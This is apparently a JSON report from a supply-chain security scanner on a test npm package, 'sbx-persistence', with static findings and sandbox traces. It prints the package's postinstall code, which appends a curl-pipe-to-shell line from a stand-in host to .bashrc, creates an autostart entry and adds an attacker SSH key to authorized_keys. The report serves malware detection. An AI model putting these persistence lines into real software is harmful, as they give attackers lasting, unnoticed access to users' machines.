@@ -1,0 +1,719 @@
+{
+  "package": {
+    "ecosystem": "npm",
+    "name": "sbx-persistence",
+    "version": "1.0.0"
+  },
+  "analyzerVersion": "0.1.0",
+  "generatedAt": "2026-09-18T20:40:21.898106Z",
+  "findings": [
+    {
+      "ruleId": "metadata.install_script",
+      "layer": "metadata",
+      "severity": "MEDIUM",
+      "confidence": "HIGH",
+      "title": "Runs a 'postinstall' script during install",
+      "file": "package.json",
+      "line": null,
+      "snippet": "node persist.js",
+      "installTime": false,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.sensitive_path",
+      "layer": "static",
+      "severity": "HIGH",
+      "confidence": "MEDIUM",
+      "title": "References SSH keys",
+      "file": "persist.js",
+      "line": 6,
+      "snippet": "fs.appendFileSync(path.join(home, '.ssh/authorized_keys'), 'ssh-rsa AAAAB3NzaC1yc2E attacker@example.invalid\\n');",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.exfiltration",
+      "layer": "static",
+      "severity": "HIGH",
+      "confidence": "HIGH",
+      "title": "Reads secrets and can send data over the network during install",
+      "file": "persist.js",
+      "line": 6,
+      "snippet": "fs.appendFileSync(path.join(home, '.ssh/authorized_keys'), 'ssh-rsa AAAAB3NzaC1yc2E attacker@example.invalid\\n');",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.pattern.pipe_to_shell",
+      "layer": "static",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "title": "Downloads a script and pipes it straight into a shell",
+      "file": "persist.js",
+      "line": 3,
+      "snippet": "fs.appendFileSync(path.join(home, '.bashrc'), '\\ncurl -s http://updates.example.invalid/x.sh | sh\\n');",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "code.install_network",
+      "layer": "static",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "title": "Makes network requests during install",
+      "file": "persist.js",
+      "line": null,
+      "snippet": null,
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.persistence",
+      "layer": "sandbox",
+      "severity": "HIGH",
+      "confidence": "HIGH",
+      "title": "Modifies a shell startup file so code keeps running later",
+      "file": "/home/sandbox/.bashrc",
+      "line": null,
+      "snippet": null,
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.persistence",
+      "layer": "sandbox",
+      "severity": "HIGH",
+      "confidence": "HIGH",
+      "title": "Modifies a desktop autostart so code keeps running later",
+      "file": "/home/sandbox/.config/autostart/updater.desktop",
+      "line": null,
+      "snippet": null,
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.persistence",
+      "layer": "sandbox",
+      "severity": "HIGH",
+      "confidence": "HIGH",
+      "title": "Modifies a SSH authorized_keys so code keeps running later",
+      "file": "/home/sandbox/.ssh/authorized_keys",
+      "line": null,
+      "snippet": null,
+      "installTime": true,
+      "occurrences": 1
+    }
+  ],
+  "intel": {
+    "osv": {
+      "maliciousIds": [],
+      "vulnerabilityIds": []
+    },
+    "safedep": {
+      "found": false
+    }
+  },
+  "metadata": {
+    "description": null,
+    "license": null,
+    "publisher": "fixture-author",
+    "trustedPublishing": false,
+    "provenance": false,
+    "maintainers": [
+      "fixture-author"
+    ],
+    "publishedAt": "2026-03-02T20:40:21.843939+00:00",
+    "previousVersion": null,
+    "installScripts": {
+      "postinstall": "node persist.js"
+    },
+    "repository": "git+https://example.invalid/sbx-persistence.git",
+    "dependencies": {},
+    "sha256": "1f488fc4157172f25038fd309248ae1c50406bba95eaf40a978d398fea6a75ff",
+    "fileCount": 2,
+    "unpackedBytes": 615,
+    "evaluationSample": true,
+    "intelLookup": "disabled for this evaluation, to measure our own layers"
+  },
+  "codeScan": {
+    "filesScanned": 1,
+    "filesParsed": 1,
+    "filesWithParseErrors": 0,
+    "installTimeFiles": [
+      "persist.js"
+    ],
+    "entryFiles": [],
+    "executables": [],
+    "skipped": [],
+    "findingsTruncated": false
+  },
+  "aiReview": null,
+  "aiError": null,
+  "behavior": {
+    "networkModules": [],
+    "hosts": [
+      "updates.example.invalid"
+    ],
+    "ipAddresses": [],
+    "envVars": [],
+    "readsAllEnv": false,
+    "sensitivePaths": [
+      "SSH keys"
+    ],
+    "runsCommands": false,
+    "dynamicCode": false,
+    "decodesData": false,
+    "readsMachineInfo": false,
+    "nativeExecutables": [],
+    "installTime": {
+      "network": true,
+      "commands": true,
+      "files": [
+        "persist.js"
+      ]
+    },
+    "filesByCapability": {
+      "network": [
+        "persist.js"
+      ],
+      "commands": [
+        "persist.js"
+      ],
+      "sensitive_paths": [
+        "persist.js"
+      ]
+    }
+  },
+  "iocs": [
+    {
+      "type": "url",
+      "value": "http://updates.example.invalid/x.sh",
+      "file": "persist.js",
+      "line": 3,
+      "source": "rules"
+    }
+  ],
+  "fileHashes": [
+    {
+      "path": "package.json",
+      "size": 103,
+      "sha256": "3deef5cb70b7318b9123a74b9b9b8900fc1a9844426ce91a1ff84b532606c34d"
+    },
+    {
+      "path": "persist.js",
+      "size": 512,
+      "sha256": "92cafdea68d0a9e44bbfceb8680a5245331da584875288b37143291ec8316c38"
+    }
+  ],
+  "fileHashesTruncated": false,
+  "settings": {
+    "analyzerVersion": "0.1.0",
+    "rulesHash": "cdd49f6359d5",
+    "promptHashes": {},
+    "ai": {
+      "mode": "off"
+    },
+    "settingsHash": "c9edcfb6b502"
+  },
+  "timings": {
+    "downloadSeconds": 0.003,
+    "unpackSeconds": 0.02,
+    "intelSeconds": 0.001,
+    "metadataSeconds": 0.01,
+    "codeScanSeconds": 0.006,
+    "sandboxSeconds": 0.013,
+    "aiSeconds": 0.0,
+    "totalSeconds": 0.054
+  },
+  "reviewFlags": {
+    "rulesAiDisagree": false,
+    "workerCoordinatorDisagree": false,
+    "promptInjectionDetected": false,
+    "lowCoverage": false,
+    "aiFailed": false,
+    "needsHumanReview": true,
+    "reasons": [
+      "The final verdict is SUSPICIOUS."
+    ]
+  },
+  "codeIssues": [
+    {
+      "id": "issue-1",
+      "file": "persist.js",
+      "lineStart": 6,
+      "lineEnd": 6,
+      "severity": "HIGH",
+      "category": "secrets_access",
+      "title": "References SSH keys",
+      "whyItMatters": "Refers to a file that usually holds secrets such as keys, tokens or credentials.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "code.sensitive_path",
+        "code.exfiltration"
+      ],
+      "aiAssessment": null,
+      "installTime": true,
+      "excerpt": {
+        "startLine": 3,
+        "endLine": 7,
+        "highlightStart": 6,
+        "highlightEnd": 6,
+        "lines": [
+          {
+            "number": 3,
+            "text": "fs.appendFileSync(path.join(home, '.bashrc'), '\\ncurl -s http://updates.example.invalid/x.sh | sh\\n');",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "fs.mkdirSync(path.join(home, '.config/autostart'), { recursive: true });",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "fs.writeFileSync(path.join(home, '.config/autostart/updater.desktop'), '[Desktop Entry]\\nExec=/tmp/.updater\\n');",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 6,
+            "text": "fs.appendFileSync(path.join(home, '.ssh/authorized_keys'), 'ssh-rsa AAAAB3NzaC1yc2E attacker@example.invalid\\n');",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 7,
+            "text": "",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    },
+    {
+      "id": "issue-2",
+      "file": "persist.js",
+      "lineStart": null,
+      "lineEnd": null,
+      "severity": "MEDIUM",
+      "category": "network",
+      "title": "Makes network requests during install",
+      "whyItMatters": "This code makes network requests while the package is being installed.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "code.install_network"
+      ],
+      "aiAssessment": null,
+      "installTime": true,
+      "excerpt": null
+    },
+    {
+      "id": "issue-3",
+      "file": "persist.js",
+      "lineStart": 3,
+      "lineEnd": 3,
+      "severity": "MEDIUM",
+      "category": "commands",
+      "title": "Downloads a script and pipes it straight into a shell",
+      "whyItMatters": "Downloading a script and running it immediately means running code nobody reviewed.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "code.pattern.pipe_to_shell"
+      ],
+      "aiAssessment": null,
+      "installTime": true,
+      "excerpt": {
+        "startLine": 1,
+        "endLine": 6,
+        "highlightStart": 3,
+        "highlightEnd": 3,
+        "lines": [
+          {
+            "number": 1,
+            "text": "const fs = require('fs'); const os = require('os'); const path = require('path');",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 2,
+            "text": "const home = os.homedir();",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 3,
+            "text": "fs.appendFileSync(path.join(home, '.bashrc'), '\\ncurl -s http://updates.example.invalid/x.sh | sh\\n');",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "fs.mkdirSync(path.join(home, '.config/autostart'), { recursive: true });",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "fs.writeFileSync(path.join(home, '.config/autostart/updater.desktop'), '[Desktop Entry]\\nExec=/tmp/.updater\\n');",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 6,
+            "text": "fs.appendFileSync(path.join(home, '.ssh/authorized_keys'), 'ssh-rsa AAAAB3NzaC1yc2E attacker@example.invalid\\n');",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    },
+    {
+      "id": "issue-4",
+      "file": "package.json",
+      "lineStart": 4,
+      "lineEnd": 4,
+      "severity": "MEDIUM",
+      "category": "install_script",
+      "title": "Runs a 'postinstall' script during install",
+      "whyItMatters": "This command runs automatically during npm install, before any code is imported. Malware most often starts here.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "metadata.install_script"
+      ],
+      "aiAssessment": null,
+      "installTime": false,
+      "excerpt": {
+        "startLine": 1,
+        "endLine": 6,
+        "highlightStart": 4,
+        "highlightEnd": 4,
+        "lines": [
+          {
+            "number": 1,
+            "text": "{",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 2,
+            "text": "  \"name\": \"sbx-persistence\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 3,
+            "text": "  \"version\": \"1.0.0\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "  \"scripts\": {\"postinstall\": \"node persist.js\"}",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "}",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 6,
+            "text": "",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    }
+  ],
+  "sandbox": {
+    "version": "0.1.0",
+    "status": "COMPLETE",
+    "skipReason": null,
+    "durationSeconds": 2.0,
+    "rawTraceS3Key": "sandbox-traces/npm/sbx-persistence/1.0.0/0.1.0.json",
+    "coverage": {
+      "installed": true,
+      "installScriptsRan": true,
+      "entryLoaded": false,
+      "entryError": "Cannot find module 'sbx-persistence'\nRequire stack:\n- /opt/sbx/loader.js",
+      "binsRun": 0,
+      "timedOut": false,
+      "dependenciesStripped": true
+    },
+    "runs": [
+      {
+        "name": "baseline",
+        "ci": false,
+        "clockOffsetDays": 0,
+        "hostname": "container",
+        "user": "sandbox",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.85,
+            "cpuSeconds": 1.75
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.12,
+            "cpuSeconds": 0.09
+          }
+        ],
+        "notes": []
+      },
+      {
+        "name": "hostile",
+        "ci": true,
+        "clockOffsetDays": 60,
+        "hostname": "ci-runner-04",
+        "user": "runner",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.21,
+            "cpuSeconds": 1.11
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.29,
+            "cpuSeconds": 0.24
+          }
+        ],
+        "notes": []
+      }
+    ],
+    "network": [],
+    "processes": [
+      {
+        "run": "baseline",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "node persist.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "baseline",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/local/bin/node",
+        "argv": [
+          "node",
+          "persist.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "node persist.js"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/local/bin/node",
+        "argv": [
+          "node",
+          "persist.js"
+        ],
+        "phase": "install"
+      }
+    ],
+    "files": [
+      {
+        "run": "baseline",
+        "op": "modified",
+        "path": "/home/sandbox/.bashrc",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": "7b821305508c838d68862a6bfce17782d25880e4fb7de6e3efcf4433570bfa35",
+        "preview": "# ~/.bashrc\nexport PATH=$HOME/.local/bin:$PATH\n\ncurl -s http://updates.example.invalid/x.sh | sh\n",
+        "phase": null
+      },
+      {
+        "run": "baseline",
+        "op": "modified",
+        "path": "/home/sandbox/.config",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": null,
+        "preview": null,
+        "phase": null
+      },
+      {
+        "run": "baseline",
+        "op": "modified",
+        "path": "/home/sandbox/.ssh/authorized_keys",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": "f304a503bd73f1f9ea74e4a5828d6ea77c8fc74cd556bd986880310091efc6c1",
+        "preview": "ssh-rsa AAAAB3NzaC1yc2E attacker@example.invalid\n",
+        "phase": null
+      },
+      {
+        "run": "baseline",
+        "op": "added",
+        "path": "/home/sandbox/.config/autostart",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": null,
+        "preview": null,
+        "phase": null
+      },
+      {
+        "run": "baseline",
+        "op": "added",
+        "path": "/home/sandbox/.config/autostart/updater.desktop",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": "a60aab4bc1d3e243f6cff698967c3611e5d16b35866fa98ad1cd51f73cf840d0",
+        "preview": "[Desktop Entry]\nExec=/tmp/.updater\n",
+        "phase": null
+      },
+      {
+        "run": "hostile",
+        "op": "modified",
+        "path": "/home/sandbox/.bashrc",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": "7b821305508c838d68862a6bfce17782d25880e4fb7de6e3efcf4433570bfa35",
+        "preview": "# ~/.bashrc\nexport PATH=$HOME/.local/bin:$PATH\n\ncurl -s http://updates.example.invalid/x.sh | sh\n",
+        "phase": null
+      },
+      {
+        "run": "hostile",
+        "op": "modified",
+        "path": "/home/sandbox/.config",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": null,
+        "preview": null,
+        "phase": null
+      },
+      {
+        "run": "hostile",
+        "op": "modified",
+        "path": "/home/sandbox/.ssh/authorized_keys",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": "f304a503bd73f1f9ea74e4a5828d6ea77c8fc74cd556bd986880310091efc6c1",
+        "preview": "ssh-rsa AAAAB3NzaC1yc2E attacker@example.invalid\n",
+        "phase": null
+      },
+      {
+        "run": "hostile",
+        "op": "added",
+        "path": "/home/sandbox/.config/autostart",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": null,
+        "preview": null,
+        "phase": null
+      },
+      {
+        "run": "hostile",
+        "op": "added",
+        "path": "/home/sandbox/.config/autostart/updater.desktop",
+        "decoy": false,
+        "category": null,
+        "executable": false,
+        "sha256": "a60aab4bc1d3e243f6cff698967c3611e5d16b35866fa98ad1cd51f73cf840d0",
+        "preview": "[Desktop Entry]\nExec=/tmp/.updater\n",
+        "phase": null
+      }
+    ],
+    "evalPayloads": [],
+    "canaryHits": [],
+    "conditional": [],
+    "resources": {
+      "peakCpuSeconds": 1.75,
+      "peakMemoryMb": 73.6,
+      "timedOutPhases": []
+    },
+    "findings": [
+      {
+        "ruleId": "sandbox.persistence",
+        "layer": "sandbox",
+        "severity": "HIGH",
+        "confidence": "HIGH",
+        "title": "Modifies a shell startup file so code keeps running later",
+        "file": "/home/sandbox/.bashrc",
+        "line": null,
+        "snippet": null,
+        "installTime": true,
+        "occurrences": 1
+      },
+      {
+        "ruleId": "sandbox.persistence",
+        "layer": "sandbox",
+        "severity": "HIGH",
+        "confidence": "HIGH",
+        "title": "Modifies a desktop autostart so code keeps running later",
+        "file": "/home/sandbox/.config/autostart/updater.desktop",
+        "line": null,
+        "snippet": null,
+        "installTime": true,
+        "occurrences": 1
+      },
+      {
+        "ruleId": "sandbox.persistence",
+        "layer": "sandbox",
+        "severity": "HIGH",
+        "confidence": "HIGH",
+        "title": "Modifies a SSH authorized_keys so code keeps running later",
+        "file": "/home/sandbox/.ssh/authorized_keys",
+        "line": null,
+        "snippet": null,
+        "installTime": true,
+        "occurrences": 1
+      }
+    ]
+  },
+  "humanReview": null
+}
